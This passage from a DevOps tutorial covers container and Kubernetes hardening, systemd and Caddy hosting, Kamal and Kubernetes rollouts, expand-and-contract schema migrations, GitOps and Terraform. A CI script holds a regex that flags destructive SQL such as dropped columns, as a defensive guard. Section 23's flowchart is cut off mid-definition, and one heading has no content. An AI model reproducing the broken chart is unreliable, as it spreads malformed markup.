- **Mechanism:** a **distroless** image contains only the runtime and its libraries: **no shell, no package manager**. Google's distroless project publishes Node images (for example `gcr.io/distroless/nodejs22-debian13`) with a `nonroot` tag that runs as an unprivileged user by default. The image's entrypoint is already `node`, so `CMD` lists only the script.

```dockerfile title="Dockerfile (runtime stage swapped for distroless)"
# ---------- build stage: unchanged from section 13 ----------
FROM node:22.11-bookworm-slim AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci
COPY tsconfig*.json nest-cli.json ./
COPY src ./src
RUN npm run build && npm prune --omit=dev

# ---------- runtime: no shell, no apt, non-root ----------
FROM gcr.io/distroless/nodejs22-debian13:nonroot
WORKDIR /app
ENV NODE_ENV=production
COPY --from=build /app/node_modules ./node_modules
COPY --from=build /app/dist ./dist
COPY package.json ./
ARG GIT_SHA=dev
ENV GIT_SHA=$GIT_SHA
EXPOSE 3000
# entrypoint is already node: list only the script (exec form, node is PID 1)
CMD ["dist/main.js"]
```

- **Edge cases:**
  - No shell means **no `RUN` instructions** in that stage, no shell-form `CMD`, and no `HEALTHCHECK CMD curl ...`. Health checks come from the orchestrator's HTTP probes instead.
  - Debugging: use the `:debug` variant (adds a busybox shell) in a non-production build, or attach an ephemeral debug container in Kubernetes (`kubectl debug -it pod/api-xyz --image=busybox --target=api`) instead of baking a shell in.
  - Native modules (`sharp`, `bcrypt`) must be built against the same libc and Debian version as the runtime image. Build them in a stage from the matching Debian release, or they fail at startup with a missing shared library.

#### Read-only root filesystem ➕
- **Problem:** with a writable filesystem, an attacker can modify the app's own JavaScript (a persistent backdoor until the container restarts) or drop binaries to run.
- **Why it's safe to remove:** a twelve-factor process writes nothing that matters to local disk. Logs go to stdout, state goes to backing services (section 11's "the container filesystem is disposable").
- **Mechanism:** mount the root filesystem **read-only**, and give the few paths that genuinely need writes (temporary uploads, a library's cache) a small **in-memory `emptyDir`**.

```yaml
containers:
  - name: api
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
      - { name: tmp, mountPath: /tmp }      # the only writable path
volumes:
  - name: tmp
    emptyDir: { medium: Memory, sizeLimit: 64Mi }
```

- **Edge cases:** the first deploy usually reveals hidden writers: a library writing to `~/.cache`, a tool creating a lock file, Node's compile cache. Find them in staging (`EROFS: read-only file system` errors), then either point them at `/tmp` with an env var or mount another `emptyDir`. A memory-backed `emptyDir` counts against the container's memory limit, so a big temp file can trigger an `OOMKilled`.

#### Drop capabilities, block privilege escalation, filter syscalls ➕
- **Problem:** "non-root" is not the whole story. Linux splits root's powers into **capabilities** (bind low ports, change file ownership, use raw sockets...), and container runtimes grant a default set. A setuid binary or a kernel bug can also let a process **gain** privileges after it starts.
- **Mechanism:** in the Pod `securityContext`:
  - `runAsNonRoot: true`: the kubelet refuses to start the container if the image would run as UID 0.
  - `allowPrivilegeEscalation: false`: sets the kernel's `no_new_privs` flag, so setuid binaries can't raise privileges.
  - `capabilities: drop: ["ALL"]`: a Node HTTP server on port 3000 needs **none**.
  - `seccompProfile: RuntimeDefault`: the runtime's default system-call filter blocks rarely needed, dangerous calls at the kernel.

```yaml title="k8s/api.yaml (pod and container securityContext)"
spec:
  template:
    spec:
      automountServiceAccountToken: false     # the API doesn't call the Kubernetes API
      securityContext:
        runAsNonRoot: true
        seccompProfile: { type: RuntimeDefault }
      containers:
        - name: api
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
```

```bash
# the same restrictions outside Kubernetes
docker run --read-only --tmpfs /tmp:size=64m --cap-drop ALL \
  --security-opt no-new-privileges --user 65532:65532 api@sha256:9a1f...
```

- **Edge cases:** binding a port **below 1024** as non-root needs `NET_BIND_SERVICE`. It's simpler to listen on 3000 and let the Service map 80 to it. `automountServiceAccountToken: false` removes the Kubernetes API token from the pod, so a compromised pod can't query the cluster. Turn it back on only for pods that genuinely call the API.

#### Enforce it for every namespace: Pod Security Admission ➕
- **Problem:** settings that each team has to remember get forgotten. One Deployment without them is the weak point.
- **Mechanism:** Kubernetes ships **Pod Security Admission**, which checks pods against the **Pod Security Standards** when they are created. Label a namespace with a level, and the **`restricted`** level rejects pods that don't drop all capabilities, run as non-root, block privilege escalation and use a seccomp profile. (`readOnlyRootFilesystem` isn't part of `restricted`, so enforce it in review or with a policy engine.)

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: api
  labels:
    pod-security.kubernetes.io/enforce: restricted     # reject non-compliant pods
    pod-security.kubernetes.io/warn: restricted        # and warn on kubectl apply
    pod-security.kubernetes.io/audit: restricted
```

- **Edge cases:** admission checks **pods**, so a non-compliant Deployment is accepted but its ReplicaSet can't create pods, and the rollout stalls with events on the ReplicaSet, not on the Deployment. Roll out with `warn` and `audit` first, fix what they report, then switch on `enforce`. Some third-party agents (log shippers, CNI plugins) legitimately need more privileges; keep them in their own namespace with a lower level.

## 18. Running on one machine 🎓

Running a service on one Linux box means three things:
1. **A process** the OS starts at boot and **restarts whenever it dies**.
2. **A reverse proxy** in front on **80/443** that **terminates TLS** and forwards to the service's port.
3. **Logs** going somewhere you can read them.

<Mermaid chart={`flowchart LR
  U["user"] -->|"DNS: api.example.com"| IP["server IP"]
  IP --> FW["firewall<br/>allow 80, 443"]
  FW --> RP["Caddy / Nginx<br/>TLS termination"]
  RP -->|"localhost:3000"| C["container<br/>started by systemd"]
  C -->|"stdout"| J["journald<br/>journalctl -u api"]`} />

### systemd: the process keeper
**systemd** is the init system on every mainstream Linux. A **unit file** says what to run, as which user, and to restart on failure. The process's stdout goes to the **journal**; read it with **`journalctl -u <unit>`**. If the process exits, systemd starts it again after a delay. With containers, the unit simply runs `docker run`.

```ini title="/etc/systemd/system/api.service (🔧)"
[Unit]
Description=api
After=docker.service network-online.target
Requires=docker.service

[Service]
Restart=always
RestartSec=5
EnvironmentFile=/etc/api/env
ExecStartPre=-/usr/bin/docker rm -f api
ExecStart=/usr/bin/docker run --name api --init --env-file /etc/api/env \
  -p 127.0.0.1:3000:3000 --memory 512m \
  123456789012.dkr.ecr.eu-west-1.amazonaws.com/api@sha256:9a1f...
ExecStop=/usr/bin/docker stop -t 30 api

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable --now api
journalctl -u api -f
```

Binding to `127.0.0.1:3000` means only the proxy can reach the app; the firewall exposes 80 and 443 only.

### Reverse proxy and HTTPS with ACME 🎓
The domain's DNS record points at the machine's IP; the firewall lets **80 or 443** through to **Nginx or Caddy**, which forwards to the process. To serve **HTTPS** the proxy needs a certificate. That used to be a painful manual process; now **no human is involved**, because issuing a certificate became a protocol: **ACME**. **Let's Encrypt** is the free certificate authority that runs it at scale.

<Mermaid chart={`sequenceDiagram
  autonumber
  participant S as Server (ACME client)
  participant CA as Let's Encrypt
  S->>S: generate key pair
  S->>CA: I want a certificate for api.example.com
  CA-->>S: challenge: serve this token at a URL on port 80, or publish a DNS record
  S->>S: place the token
  CA->>S: fetch token from several vantage points
  CA-->>S: OK, you control the domain
  S->>CA: certificate signing request
  CA-->>S: certificate, valid 90 days
  Note over S,CA: client auto-renews around day 60`} />

**Why only 90 days:** the client renews automatically about every **60 days** anyway, so a short life costs nothing, and a **stolen key is only useful for a few weeks**.

🔧 Let's Encrypt has announced lifetimes will shrink further, to **45 days by 2028** (with an intermediate 64-day step in 2027). Automated renewal is the only sane option.

### What the demo shows 🎓
A **DNS record** points at the machine's IP. The **Caddy config** has the domain and the port to forward to. On start, Caddy's log shows it **requesting a certificate, answering the challenge on port 80**, and receiving it. A request from outside shows the **issuer and expiry date**. Caddy has ACME **built in**: give it a domain and it obtains and renews the certificate itself.

```text title="Caddyfile (🔧)"
api.example.com {
	encode zstd gzip
	reverse_proxy 127.0.0.1:3000 {
		health_uri /health
	}
}
```

## 19. Many machines: Kamal 🎓

### Problem
More users → **horizontal scaling** (more servers, not a bigger one). With three machines, a deploy means building the image, running it on **each** machine, starting the new version, stopping the old one, and doing it **with zero downtime**, no user seeing a 500.

### Mechanism: Kamal (scripted over SSH)
**Kamal** automates exactly that from your laptop or CI:
1. **SSH** to each host; **install Docker** if missing.
2. **Log in to the registry**, **build** the image, **push** it.
3. On each host: **pull** the new image and **start the new container next to the old one**.
4. **Wait until it's healthy**, by polling an **unauthenticated `/health` or `/status`** endpoint until it returns success.
5. **Tell the reverse proxy to send traffic to the new container.**
6. **Stop the old container.**

<Mermaid chart={`sequenceDiagram
  autonumber
  participant K as kamal deploy
  participant H as each host
  participant PX as proxy on host
  participant OLD as old container
  participant NEW as new container
  K->>H: SSH, ensure Docker, registry login
  K->>H: pull image 3f9c2e1
  H->>NEW: start alongside OLD
  loop until healthy
    PX->>NEW: GET /health
  end
  PX->>PX: switch traffic to NEW
  H->>OLD: stop (drains in-flight requests)`} />

```yaml title="config/deploy.yml (Kamal, 🔧)"
service: api
image: acme/api
servers:
  web:
    - 10.0.1.11
    - 10.0.1.12
    - 10.0.1.13
proxy:
  host: api.example.com
  ssl: true                     # ACME via the built-in proxy
  app_port: 3000
  healthcheck:
    path: /health
    interval: 3
registry:
  server: 123456789012.dkr.ecr.eu-west-1.amazonaws.com
  username: AWS
  password:
    - KAMAL_REGISTRY_PASSWORD
env:
  clear:
    PORT: 3000
  secret:
    - DATABASE_URL
```

🔧 **Edge cases:** the health endpoint should check that the app is **able to serve** (booted, config loaded), not that every dependency is perfect, or a slow database blocks every deploy. Old and new containers run **together** for a moment, so a schema change must work with both versions.

## 20. Snowflakes vs immutable infrastructure 🎓

### Problem
Everything so far treated the machine as **precious**: someone maintains it, updates it, repairs it. Over time it becomes more and more unique: a **snowflake** (Twelve-Factor lesson). Only one or two people can fix it, and when they're absent or leave, the knowledge leaves too.

### Mechanism
- **Never maintain machines by hand.** Use a **code-first, automated** approach with minimal human involvement.
- With 3–4 instances, **never SSH into one to change it.** Change the code and **redeploy the whole stack**, replacing old instances. Otherwise one server **drifts** from the others.
- **Immutable infrastructure:** a server is **never modified after it starts, only replaced** by a new version.
- **Containers made this cheap:** the unit you replace is no longer a physical server with an OS to configure, just a **container image**.

Everything about clusters below **assumes servers are cheap, replaced and never modified after start.**

## 21. Orchestrators and Kubernetes 🎓

### Problem: 40 containers on 10 machines
- **Which container runs where?**
- A machine **dies**: who notices, and who starts replacements elsewhere?
- Traffic **doubles or spikes**: who starts more copies?
- A **new image**: who replaces 40 old containers with 40 new ones **in the right order with no downtime**?

The program that answers these is an **orchestrator**. The best known is **Kubernetes**, the open-source descendant of a system **Google ran internally for years**, so many real-world problems were already solved before it was public.

### Mechanism: declare the end state, controllers reconcile 🎓
You don't tell Kubernetes **what to do**; you tell it **what you want**, and it works out the steps. *"Three copies of this image, on this port, with this much memory."*

- You submit that document to the **API server**, which stores it.
- **Controllers** watch the store. A controller **compares what you asked for with what exists** and acts on the difference: you want 3, 2 are running, start 1; a machine dies and the count drops to 2, start another.

<Mermaid chart={`flowchart TB
  subgraph CP["Control plane"]
    API["API server<br/>only thing that talks to the store"] <--> ETCD[("etcd<br/>distributed key-value store")]
    SCH["scheduler<br/>picks a machine for each new pod"] --> API
    CM["controller manager<br/>built-in reconcile loops"] --> API
  end
  subgraph N1["Node"]
    KL1["kubelet<br/>what should run here?"] --> CR1["containerd"] --> P1["pods"]
    KP1["kube-proxy<br/>service networking"]
  end
  subgraph N2["Node"]
    KL2["kubelet"] --> CR2["containerd"] --> P2["pods"]
    KP2["kube-proxy"]
  end
  KL1 --> API
  KL2 --> API`} />

| Component | Job |
|---|---|
| **API server** | the front door, and the only thing that talks to the store |
| **etcd** | the store: a distributed key-value database |
| **scheduler** | a controller that **picks a machine** for every new pod |
| **controller manager** | runs the built-in reconcile loops |
| **kubelet** (every machine) | asks the API server what should run there and makes it so through the container runtime |
| **kube-proxy** | networking for Services |

### The objects 🎓
- **Pod:** not another name for a container. **One or more containers on one machine sharing a network namespace and volumes.** Usually just yours. The extra layer exists because a process sometimes needs a **helper**: a log shipper reading the same files, or a proxy on the same localhost (a **sidecar**). The pod is the unit that is **scheduled, gets an IP and gets killed**. Each pod has **its own IP**, so two pods can both listen on 8080. **Pods are never created by hand**, and when a pod's machine dies, the pod is gone for good.
- **Labels:** key-value pairs like `app=api`, `version=v2`, used to group and select pods.
- **ReplicaSet:** a controller that keeps **N pods** of a template running.
- **Deployment:** owns ReplicaSets. Change the template (a new image) and it **creates a new ReplicaSet and moves the count from old to new**. **You write Deployments; you never touch ReplicaSets.**
- **Service:** a **fixed virtual IP and DNS name** for a set of pods selected by labels. Pods are mortal and their IPs keep changing; the Service doesn't. Other services in the cluster call it by name.
- **Ingress**, now succeeded by the **Gateway API**: maps a **hostname and path to a Service**; a controller programs a real **load balancer**.
- The full picture: **domain → load balancer → Service → pods.** Only the pods change on each deploy; everything in front stays put.
- **ConfigMap:** non-sensitive key-value config, mounted as **env vars or files**.
- **Secret:** the same shape, for credentials, **given only to pods that explicitly ask** for it.
- **Resources per container:** **requests** = what's **reserved** for you on a machine (the scheduler uses it); **limits** = the **hard ceiling**. Limits are cgroups (section 10): a **512 MB** memory limit is written to **`memory.max`**, a CPU limit becomes the quota in **`cpu.max`**. Exceed memory → the kernel kills the container → **`OOMKilled`** → the kubelet restarts it.

### 🔧 The manifests for a NestJS API

### Rolling updates 🎓
On a new image, the Deployment controller **creates a new ReplicaSet** and shifts the count in steps bounded by two numbers:
- **`maxSurge`**: how many pods **above** the desired count may exist during the change,
- **`maxUnavailable`**: how many **below** the desired count are allowed,
- both **25% by default**.

With **3 replicas and the defaults**: scale the new set up by one → **wait for it to be ready** → scale the old set down by one → wait → repeat until **new = 3, old = 0**.

**Two safety mechanisms:**
1. **Readiness gating:** a new pod gets **no traffic until it reports ready**. A broken image can only **stall the rollout**; it can't take the service down.
2. **The old ReplicaSet is kept at 0, not deleted**, so rollback is easy.

<Mermaid chart={`flowchart LR
  S0["old 3 / new 0"] --> S1["old 3 / new 1<br/>wait for ready"]
  S1 --> S2["old 2 / new 1"]
  S2 --> S3["old 2 / new 2<br/>wait for ready"]
  S3 --> S4["old 1 / new 2"]
  S4 --> S5["old 1 / new 3<br/>wait for ready"]
  S5 --> S6["old 0 / new 3<br/>old ReplicaSet kept for rollback"]`} />

**What the demo shows:** three old replicas; set a new image; one new pod is created and waits to be ready; one old pod terminates; repeat, one at a time. **No errors anywhere**, and **both versions served traffic for about 30 seconds**. That overlap is what makes zero downtime possible.

```bash
# 🔧 the commands behind it
kubectl set image deployment/api api=123456789012.dkr.ecr.eu-west-1.amazonaws.com/api@sha256:cd34...
kubectl rollout status deployment/api
kubectl rollout undo deployment/api            # back to the previous ReplicaSet
```

### Probes: where "ready" comes from 🎓
**"Ready" is something your own code exposes**, usually a `/health` or `/status` endpoint returning **200**. The kubelet runs **probes** against the container on a schedule: run a command, GET a path, or open a TCP port.

| Probe | Decides | On failure |
|---|---|---|
| **Readiness** | whether the pod **receives traffic** | removed from the Service's endpoints; **nothing restarts**; added back when it passes |
| **Liveness** | whether the container is **alive** | after enough failures the kubelet **kills and restarts** it |
| **Startup** | whether the process **finished starting** | **holds the other two** until it passes, for slow starters |

**The pitfall:** a **liveness probe that touches the database**. The database slows down → the probe times out → the kubelet **restarts perfectly healthy pods** → **every pod restarts in a wave** → the restarts **make the database even slower**.

**Rule: liveness checks only "is the process stuck?"; readiness checks "can this pod serve right now?"**

```ts title="🔧 separate endpoints for the two questions"
@Controller()
export class ProbesController {
  constructor(private readonly db: DataSource, private readonly shutdown: ShutdownState) {}

  @Get('health')                 // liveness: the event loop answers, that's all
  live() { return { ok: true }; }

  @Get('ready')                  // readiness: can I serve requests right now?
  async ready() {
    if (this.shutdown.draining) throw new ServiceUnavailableException();   // stop traffic during shutdown
    await this.db.query('SELECT 1');                                       // with a short timeout in the pool config
    return { ok: true };
  }
}
```

### Scaling 🎓
Scaling out is **changing one number**: set `replicas: 10` and the ReplicaSet controller starts **seven more** pods. The **Horizontal Pod Autoscaler** changes that number for you: it watches **average CPU across pods**, adds pods above a target and removes them below it, within a **min and max** you set.

```yaml title="🔧 HPA"
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata: { name: api }
spec:
  scaleTargetRef: { apiVersion: apps/v1, kind: Deployment, name: api }
  minReplicas: 3
  maxReplicas: 20
  metrics:
    - type: Resource
      resource: { name: cpu, target: { type: Utilization, averageUtilization: 70 } }
```

🔧 CPU utilization is measured against the **request**, so an HPA without `resources.requests.cpu` can't work. Remove `replicas` from the Deployment manifest once an HPA manages it, or every apply resets the count.

### Do you need Kubernetes? 🎓
**Start small; add complexity as you earn it.** Begin with **one machine** (systemd, Docker Compose or a hosting platform). With real traffic, move to **several machines with Kamal**. Kubernetes should become the **natural next step**, not the default on day one.

## 22. Continuous delivery vs continuous deployment 🎓

- **Continuous delivery:** the software is **always deployable**. Every merged change goes through the whole pipeline, and anyone can press a button to ship the latest code without worrying. **A technical property.**
- **Continuous deployment:** the button press is automated too. Every change that passes all checks **goes to production automatically**, many times a day. **A product or business decision.**
- You can have delivery **without** deployment (a weekly release because customers want a weekly changelog, or compliance needs a review). You **can't** have continuous deployment without continuous delivery.

```yaml title="🔧 delivery with a human gate: GitHub environment with required reviewers"
deploy-prod:
  needs: image
  runs-on: ubuntu-latest
  environment: production          # configure required reviewers on this environment
  permissions: { id-token: write, contents: read }
  steps:
    - run: ./scripts/deploy.sh ${{ github.sha }}
```

Remove the reviewers and the same pipeline is continuous deployment.

## 23. Zero-downtime deployment strategies 🎓

<Mermaid chart={`flowchart TB

  subgraph RU["Rolling"]

| Strategy | How | Downtime | Versions at once | Cost | Use when |
|---|---|---|---|---|---|
| **Recreate** | stop all old, start all new | **yes**, the gap between them | one | lowest | dev environments, or when two versions must never coexist |
| **Rolling** (Kubernetes default) | replace one copy at a time, readiness-gated | no | **two**, a request may hit either | low | old and new can safely coexist |
| **Blue-green** | two full environments; deploy to idle green, test, **switch the router**; keep blue for instant rollback | no | **one** | **double infra** while both run | you need one version at a time and instant rollback |
| **Canary** | new version on a small slice (1 of 10 pods, ~10% of traffic), compare **error rate and latency** with the old pods, widen 10 → 20 → 50 → 75 → 100%; reroute if worse | no | two, controlled | low | risky changes; you want real-traffic evidence |
| **Progressive delivery** | **canary automated**: a controller widens on a schedule, compares metrics at each step, **rolls back automatically** | no | two, controlled | tooling | many deploys a day |

**Why recreate hurts:** even a few seconds with neither version running means frontend requests fail, giving users blank pages and errors.

**Why rolling still has a catch:** both versions serve at the same time, so use it only when that's acceptable (🔧 e.g. API responses and DB schema stay compatible between versions).

## 24. Database changes inside a rollout: expand and contract ➕

Every zero-downtime strategy above either runs two app versions at once or promises a rollback to the older one, and both versions talk to **the same database**, so schema changes have to be ordered around the rollout rather than shipped with it.

**First principle:** you can run two versions of **code** side by side, but there is **one schema**. During a rolling update, a canary or a blue-green switch, the schema must work for **version N and N+1 at the same time**. And if you want to roll back to N, it must still work for N **after** N+1's migration has run.

How to run each migration safely (lock timeouts, non-blocking DDL, batched backfills) is covered in [The Twelve-Factor App](/docs/backend-first-principles/28-twelve-factor-app). This section is about **ordering across releases**.

#### Why "migrate, then deploy" still breaks ➕
- **Problem:** you rename `users.name` to `users.full_name`. The pipeline runs the migration, then rolls out the new code. For the 30 seconds of the rollout, **old pods query a column that no longer exists** and return 500s. Roll back the code and **every** pod fails, because the old code needs `name`.
- **Why:** a rename (or a drop, or a type change) is a change that **breaks the old version's assumptions**. No ordering of one migration and one deploy can satisfy both versions.
- **Mechanism:** split one breaking change into **several releases**, each compatible with the one before it. Every schema change is **additive (expand)** until no running code depends on the old shape, then a later release **removes (contract)** it.

<Mermaid chart={`flowchart LR
  R1["Release 1 EXPAND<br/>add full_name, nullable<br/>code writes both, reads name"] --> R2["Release 2 BACKFILL<br/>one-off job copies name to full_name"]
  R2 --> R3["Release 3 SWITCH<br/>code reads full_name,<br/>still writes both"]
  R3 --> R4["Release 4 STOP OLD WRITES<br/>code uses only full_name"]
  R4 --> R5["Release 5 CONTRACT<br/>drop name"]`} />

#### The five steps of a rename, and why each must ship separately ➕
Each step is safe because it only has to coexist with its **neighbour**:

| Release | Schema | Code | Rollback to the previous release is safe because... |
|---|---|---|---|
| 1. Expand | add `full_name` (nullable) | writes `name` and `full_name`, reads `name` | old code ignores the extra column |
| 2. Backfill | none (data only) | unchanged | data was only added |
| 3. Switch reads | none | reads `full_name`, still writes both | release 2 code still finds `name` filled in |
| 4. Stop old writes | none | writes only `full_name` | release 3 reads `full_name` too |
| 5. Contract | drop `name` | unchanged | no running code mentions `name` |

```ts title="release 1 (expand): dual-write, old read path"
@Injectable()
export class UsersRepo {
  constructor(private readonly db: DataSource) {}

  async rename(id: string, value: string) {
    // write both shapes, so either release's code finds what it expects
    await this.db.query('UPDATE users SET name = $2, full_name = $2 WHERE id = $1', [id, value]);
  }

  async get(id: string) {
    const [u] = await this.db.query('SELECT id, name FROM users WHERE id = $1', [id]);   // still reads the old column
    return u;
  }
}
```

```yaml title=".github/workflows/deploy.yml (contract migrations are gated separately)"
jobs:
  migrate-expand:                          # additive migrations: run automatically before every rollout
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/run-migrations.sh --dir db/migrations/expand
  rollout:
    needs: migrate-expand
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/deploy.sh ${{ github.sha }}
  migrate-contract:                        # destructive migrations: only after the rollout is done and healthy
    needs: rollout
    environment: production-contract       # a human approves, after checking no old pods or old releases remain
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/run-migrations.sh --dir db/migrations/contract
```

- **Edge cases:**
  - **Contract only when you will never roll back past it.** After `name` is dropped, release 3 can't run any more. In practice teams wait at least one full release cycle.
  - **Other readers count too:** a reporting job, a read replica feeding analytics, another service reading the table directly. "No running code mentions the column" includes them.
  - **ORMs** that select every column (`SELECT *` mapped to an entity) break the moment a column they map disappears. Remove the column from the entity mapping in release 4, before the drop in release 5.
  - **Blue-green doesn't avoid this.** Blue and green share the database, so the green version's migration runs while blue is still live, and switching back to blue after the migration is a rollback across a schema change.

#### Lint migrations in CI so destructive changes can't sneak in ➕
- **Problem:** the rules above live in people's heads. Someone ships `DROP COLUMN` in the same PR as the code change.
- **Mechanism:** fail the pipeline when a migration in the **expand** path contains a destructive or locking statement, and require such statements to live in the gated **contract** path.

```bash title="scripts/check-migrations.sh (simple guard, run in CI on changed files)"
#!/usr/bin/env bash
set -euo pipefail
changed=$(git diff --name-only origin/main -- 'db/migrations/expand/*.sql')
for f in $changed; do
  if grep -Eiq 'drop (column|table)|rename (column|to)|alter column .* type|set not null' "$f"; then
    echo "::error file=$f::destructive change in an expand migration: move it to db/migrations/contract"
    exit 1
  fi
done
```

- **Edge cases:** a regex guard is a safety net, not a parser: it misses changes made through functions, and flags harmless comments. Dedicated migration linters for Postgres (for example Squawk) parse the SQL and also flag locking forms such as a non-concurrent index build. The real control is still review plus the gated contract job.

## 25. Rollback or roll forward? ➕

The strategies above all promise a fast way back, but not every change **can** be undone by running the old code again, and choosing wrong during an incident turns a small outage into a data problem.

#### What a rollback can and cannot undo ➕
- **Problem:** "just roll back" is the instinctive mitigation (section 30), and for stateless code it's the right one. But a deploy changes more than code.
- **First principles:** a rollback restores the **old code and old config**. It does nothing to **state that the new version already changed**:

| Changed by the bad release | Undone by a rollback? |
|---|---|
| Code, config, feature-flag defaults | **yes**, that's what a release is |
| Additive schema change (expand) | doesn't need undoing: old code ignores it |
| Destructive schema change (dropped column) | **no**, the old code needs what was dropped |
| Rows written in a **new format** (new enum value, new JSON shape) | **no**, the old code may crash reading them |
| Messages already published, emails sent, payments captured | **no**, they've left your system |
| Cache entries written in a new shape | **no**, until they expire or are flushed |

- **Mechanism, a decision rule:** **roll back** when the bad release only changed code and config, or made additive changes the old version ignores. **Roll forward** (ship a fix through the normal pipeline) when the release has already written state the old version can't handle. **Turn a flag off** when the change was behind one, because that's faster than either and needs no deploy (section 2).

<Mermaid chart={`flowchart TD
  I["bad release detected"] --> F{"change behind a<br/>feature flag?"}
  F -->|yes| OFF["turn the flag off<br/>seconds, no deploy"]
  F -->|no| S{"did it write state the<br/>old version can't read?"}
  S -->|"no: code, config, additive schema"| RB["roll back<br/>previous image digest"]
  S -->|"yes: new data format,<br/>dropped column, sent events"| RF["roll forward<br/>fix through the fast pipeline"]
  RB --> PM["postmortem"]
  RF --> PM
  OFF --> PM`} />

#### Making rollback possible on purpose: N-1 compatibility ➕
- **Problem:** whether you *can* roll back is decided when the change is **written**, not during the incident.
- **Mechanism:** require every release to be **readable by the previous one**:
  - schema: expand and contract (section 24),
  - data formats: the old version must tolerate the new values. Ship the **reader** of a new enum value or JSON field one release **before** the **writer**,
  - messages and events: consumers ignore unknown fields, and producers add fields without changing old ones.

```ts title="release N: learns to read 'REFUNDED' before anyone writes it"
type OrderStatus = 'PENDING' | 'PAID' | 'SHIPPED' | 'REFUNDED';     // reader ships first

function label(status: string): string {
  switch (status) {
    case 'PENDING': return 'Pending';
    case 'PAID': return 'Paid';
    case 'SHIPPED': return 'Shipped';
    case 'REFUNDED': return 'Refunded';
    default: return 'Unknown';               // tolerate values from a future release instead of throwing
  }
}
// release N+1 starts writing 'REFUNDED'. Rolling back to N is safe because N already understands it.
```

- **Edge cases:** caches are the forgotten state. If N+1 writes a new shape under the same key, rolled-back N reads it. Put the schema version in the key (`user:v2:123`), so each version reads only its own entries.

#### Roll forward fast: a hotfix path that skips nothing important ➕
- **Problem:** rolling forward is only a real option if a fix reaches production in minutes. A 45-minute pipeline makes everyone reach for risky manual changes.
- **Mechanism:** keep the **normal** pipeline fast (section 4: cheap stages first, caching), and don't build a separate "emergency" path that skips tests. Its untested shortcuts become the next incident. What you can do is **skip waiting**: a hotfix PR from `main` gets priority on runners and an on-call approver, then goes through the same stages and the same canary, with shorter pause steps.
- **Edge cases:** after a roll-forward, the **previous** release is now the one you'd roll back to. Check that it is compatible with any data the bad release wrote, or the next rollback reintroduces the incident. Record which way you went, and why, in the incident document (section 30).

## 26. GitOps 🎓

So far the **pipeline pushes** to the cluster. Many large teams use the opposite direction. **GitOps** is a practice defined by its properties:
1. The **desired state** of the whole system (deployments, services, config maps) is written **declaratively** in files: the end state, not the steps.
2. Those files live in **Git**, so every change is **versioned, reviewed and reversible**.
3. An **agent inside the cluster pulls** the files and keeps the cluster matching them.
4. Change something directly in the cluster without changing the files, and the agent **detects the drift and reverts it**. **Git is the single source of truth.**

The lesson calls it **the balanced middle ground** between a simple systemd/Kamal setup and a hand-managed Kubernetes cluster.

- **A deploy is a pull request** that changes the **image digest**; **merging it is the deploy**.
- **The pipeline never holds cluster credentials**: it only pushes the image and opens the PR.
- Agents: **Argo CD** and **Flux**. They are the controllers in this picture.

<Mermaid chart={`flowchart LR
  DEV["merge to app repo"] --> CI["CI: test, build, push image"]
  CI -->|"PR: bump image digest"| CFG[("config repo<br/>desired state")]
  CFG -->|"review + merge"| CFG
  AG["Argo CD / Flux<br/>in cluster"] -->|"pull"| CFG
  AG -->|"apply + correct drift"| K8S["cluster<br/>actual state"]
  K8S -. "manual kubectl edit" .-> AG`} />

```yaml title="🔧 Argo CD Application"
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: api-prod, namespace: argocd }
spec:
  project: default
  source:
    repoURL: https://github.com/acme/deploy-config
    path: apps/api/overlays/prod
    targetRevision: main
  destination: { server: https://kubernetes.default.svc, namespace: api }
  syncPolicy:
    automated: { prune: true, selfHeal: true }     # selfHeal = revert manual drift
```

## 27. Environments 🎓

Environments are where pipeline stages live: development, staging, production. **Same code, same image, different config** (Twelve-Factor).

- **Preview environment:** a **temporary environment created for every pull request**, so the author and reviewers can test the change live instead of only reading code. **Destroyed automatically** on merge or close.
- **Promotion:** moving **the same artifact** from one environment to the next, usually through an **approval gate** where a human decides whether it proceeds (to staging, or to production).

<Mermaid chart={`flowchart LR
  PR["pull request"] --> PV["preview env<br/>pr-123.preview.example.com"]
  PV -->|"merge or close"| DEL["destroyed"]
  IMG["image sha256:9a1f<br/>built once"] --> STG["staging<br/>+ staging config"]
  STG -->|"approval gate"| PRD["production<br/>+ prod config"]`} />

🔧 **Edge case:** promotion means **promoting the digest**, never rebuilding for production. A rebuild can pull different dependency or base-image bytes than the ones you tested.

## 28. Infrastructure as code 🎓

### Problem
Someone created the cluster, EC2 hosts, load balancer, DNS records and security groups by hand in the AWS console or CLI. **The test:** with a brand-new AWS account and **one hour**, could you rebuild it **identically**? Even with a documented screen-by-screen runbook, doing it in an hour without mistakes is unlikely; without the doc, much harder; without the person, nearly impossible. Not "build something similar", but "build **exactly** this, with every config and edge case".

### Mechanism
Machines, networks, permissions and config are **written in files**, **version-controlled**, stored securely, with every change recorded. A **tool reads the files and applies exactly that infrastructure** to an account (AWS, Azure, GCP), and running it again and again **always produces the same result**.

### Three kinds of tools 🎓
| Kind | Does | Tool |
|---|---|---|
| **Provisioning** (the one to know) | creates machines, networks, cloud services | **Terraform**; **OpenTofu** is the fully open-source fork after Terraform's licence change |
| **Configuration management** | given a machine, installs and configures what it needs from a script | **Ansible** |
| **Image baking** | builds a machine image with everything preinstalled, ready at boot | **Packer**, with **cloud-init** for the first-boot script |

**Terraform workflow:** write resources as **blocks** → **`plan`** shows what will change → review and approve → **`apply`** makes it so through the cloud's APIs. You only need Terraform's syntax, not every AWS API.

### Terraform state 🎓
When Terraform creates a machine from a block, it must remember **"this block is that machine"**. It records the **cloud provider's ID** for the resource in a **state file**. On the next run it **reads state, asks the cloud for current reality, compares**, and the differences become the **plan**.

<Mermaid chart={`flowchart LR
  CODE["*.tf files<br/>desired"] --> PLAN["terraform plan"]
  STATE[("state<br/>block to cloud ID map")] --> PLAN
  CLOUD["AWS APIs<br/>actual"] --> PLAN
  PLAN --> DIFF["diff = the plan"]
